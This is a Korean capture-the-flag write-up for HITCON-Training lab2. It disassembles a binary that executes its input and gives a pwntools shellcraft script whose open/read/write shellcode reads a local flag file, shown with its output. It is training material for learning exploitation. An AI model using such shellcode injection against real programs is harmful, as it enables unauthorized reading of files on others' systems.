lab2
=====
pwntool의 shellcraft를 이용하여 해결하라는 문제이다.

```
Dump of assembler code for function main:
   0x08048548 <+0>:	lea    ecx,[esp+0x4]
   0x0804854c <+4>:	and    esp,0xfffffff0
   0x0804854f <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048552 <+10>:	push   ebp
   0x08048553 <+11>:	mov    ebp,esp
   0x08048555 <+13>:	push   ecx
   0x08048556 <+14>:	sub    esp,0x4
   0x08048559 <+17>:	call   0x80484cb <orw_seccomp>
   0x0804855e <+22>:	sub    esp,0xc
   0x08048561 <+25>:	push   0x80486a0
   0x08048566 <+30>:	call   0x8048380 <printf@plt>
   0x0804856b <+35>:	add    esp,0x10
   0x0804856e <+38>:	sub    esp,0x4
   0x08048571 <+41>:	push   0xc8
   0x08048576 <+46>:	push   0x804a060
   0x0804857b <+51>:	push   0x0
   0x0804857d <+53>:	call   0x8048370 <read@plt>
   0x08048582 <+58>:	add    esp,0x10
   0x08048585 <+61>:	mov    eax,0x804a060
   0x0804858a <+66>:	call   eax
   0x0804858c <+68>:	mov    eax,0x0
   0x08048591 <+73>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048594 <+76>:	leave  
   0x08048595 <+77>:	lea    esp,[ecx-0x4]
   0x08048598 <+80>:	ret    
End of assembler dump.
```
먼저 `orw.bin`파일을 열어 main함수를 살펴보았고 read함수로 들어온 내용을 main+66에서 실행한다는 것을 알 수 있었다.
즉 read함수로 내용을 입력받을때 쉘 코드를 넣어주면 된다는 것을 확인 할 수 있었다.


따라서 flag라는 파일을 생성하고 `hello boy`라는 문구를 넣었다.
그리고 shellcraft를 이용하여 아래와 같은 코드를 작성하였다.
```
from pwn import*

s = process("./orw.bin")

context(arch='i386',os='linux')

shellcode = ''
shellcode += shellcraft.pushstr('flag')
shellcode += shellcraft.open('esp',0,0)
shellcode += shellcraft.read('eax','esp',100)
shellcode += shellcraft.write(1,'esp',100)

s.recvuntil('Give my your shellcode:')
s.send(asm(shellcode))
print(s.recvline())
```
위 코드를 실행하면 `orw.bin`을 통해 flag파일 안의 내용을 읽어서 출력을 할 수 있다.

결과는 다음과 같다.
```
root@kali:~/HITCON-Training/LAB/lab2# python solv.py
[+] Starting local process './orw.bin': pid 36134
hello boy

[*] Stopped process './orw.bin' (pid 36134)
```
